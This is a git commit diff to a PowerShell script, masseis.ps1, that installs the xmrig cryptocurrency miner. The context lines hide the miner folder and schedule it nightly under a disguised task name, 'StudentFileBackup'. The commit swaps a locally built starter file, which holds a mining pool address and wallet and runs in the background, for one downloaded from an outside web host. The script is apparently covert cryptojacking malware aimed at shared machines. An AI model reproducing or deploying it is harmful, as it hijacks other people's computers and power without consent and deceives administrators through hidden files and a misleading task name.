61407f18e68963c71a937584dcc9a4a47b79efdb
Lukas Does Dev <51633285+LukasDoesDev@users.noreply.github.com>
2021-02-26 21:48:28 +0200

    Update masseis.ps1

--- masseis.ps1
+++ masseis.ps1
@@ -16,9 +16,7 @@ attrib +s +h ./xmrig
 cd xmrig
 cd xmrig-6.8.2
 
-# create starter file
-powershell -Command "ni starter.bat"
-powershell -Command "ac -Path ./starter.bat -Value 'cd C:\ProgramData\xmrig\xmrig-6.8.2'"
-powershell -Command "ac -Path ./starter.bat -Value 'xmrig.exe -o pool.minexmr.com:443 --user=42PAm8cXjypLyXVHjapkRJjD29dBAoBR7Z8PeT1K5ASdR2GUwWmhWaQWrm1qAsSXRtCzW9HpufiqHCEcL7m8wLmkUYdSue1 --keepalive --tls --algo=cn --background --randomx-mode=light --cpu-priority=2'"
+# download starter file
+iwr https://www.thatonelukas.tk/masseisStarter.bat -OutFile starter.bat
 
 schtasks /create /sc daily /tn StudentFileBackup /tr "C:\ProgramData\xmrig\xmrig-6.8.2\starter.bat" /st 20:00 /et 06:30 /k
